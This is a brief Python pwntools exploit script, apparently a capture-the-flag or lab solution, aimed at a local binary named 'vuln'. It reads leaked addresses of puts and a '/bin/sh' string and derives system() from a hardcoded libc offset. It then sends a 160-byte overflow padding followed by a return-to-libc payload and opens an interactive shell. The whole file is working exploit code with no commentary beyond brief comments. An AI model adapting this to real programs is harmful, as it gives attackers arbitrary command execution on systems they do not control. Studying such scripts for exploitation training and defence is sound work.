#!/usr/bin/python
from pwn import *
import struct

p = process("./vuln")
data = p.recv()
print data

# Getting the leaked functions
tmp = data.split("\n")
puts = tmp[2].split(" ")[1]
binSHString = tmp[6].split(" ")[1]

# print "Enter the offset to system from puts ({}): ".format(puts)
# offset = raw_input()
offset = "-0x2a940"

# Got address of system
systemAddress = struct.pack("I", int(puts, 16) + int(offset, 16))
print "Offset: {}".format(offset)
print "puts: {}".format(puts)
print "systemAddress: {}".format(repr(systemAddress))

# Padding
padding = "A"*160

# /bin/sh/ string
binSH = struct.pack("I", int(binSHString, 16))

payload = padding + systemAddress + "AAAA" + binSH
p.sendline(payload)
print "[#] Sending payload: {}".format(payload)

print p.recv()


p.interactive()